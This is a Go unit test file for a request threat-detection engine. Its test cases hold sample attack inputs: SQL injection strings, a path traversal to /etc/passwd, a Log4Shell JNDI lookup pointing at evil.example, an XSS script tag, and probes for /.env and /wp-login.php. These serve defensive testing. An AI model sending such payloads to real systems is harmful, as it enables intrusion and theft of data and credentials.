package detect

import (
	"testing"
)

func loadDefault(t *testing.T) *Engine {
	t.Helper()
	e, err := Load("../../rules/default.yml")
	if err != nil {
		t.Fatalf("load default rules: %v", err)
	}
	return e
}

func TestAnalyzeCategories(t *testing.T) {
	e := loadDefault(t)
	cases := []struct {
		name    string
		f       Fields
		wantCat string
	}{
		{"sqli", Fields{Query: "id=1' OR 1=1--"}, "sql-injection"},
		{"sqli-union", Fields{Path: "/api/users", Query: "id=2 UNION SELECT password FROM users"}, "sql-injection"},
		{"sqli-double-encoded", Fields{Query: "id=%2527%2520OR%25201%253D1--"}, "sql-injection"},
		{"traversal", Fields{Path: "/files", Query: "x=../../../../etc/passwd"}, "path-traversal"},
		{"log4shell", Fields{Query: "x=${jndi:ldap://evil.example/a}"}, "log4shell"},
		{"xss", Fields{Query: "q=<script>alert(1)</script>"}, "xss"},
		{"scanner-ua", Fields{Path: "/", UserAgent: "sqlmap/1.8#tableau"}, "recon-scanner"},
		{"scanner-path", Fields{Path: "/wp-login.php"}, "recon-scanner"},
		{"credential", Fields{Path: "/.env"}, "credential-access"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			d := e.Analyze(tc.f)
			if !d.IsMalicious() {
				t.Fatalf("expected malicious, got score 0")
			}
			for _, c := range d.Categories {
				if c == tc.wantCat {
					return
				}
			}
			t.Fatalf("category %q not in %v", tc.wantCat, d.Categories)
		})
	}
}

func TestAnalyzeBenign(t *testing.T) {
	e := loadDefault(t)
	d := e.Analyze(Fields{
		Path:      "/index.html",
		UserAgent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
	})
	if d.IsMalicious() {
		t.Fatalf("expected benign, got %+v", d)
	}
}

func TestScoreCapped(t *testing.T) {
	e := loadDefault(t)
	// Multiple categories at once must not exceed 100.
	d := e.Analyze(Fields{
		Path:      "/.env",
		Query:     "id=1' OR 1=1--",
		UserAgent: "sqlmap/1.8",
	})
	if d.Score > 100 {
		t.Fatalf("score %d exceeds cap", d.Score)
	}
}
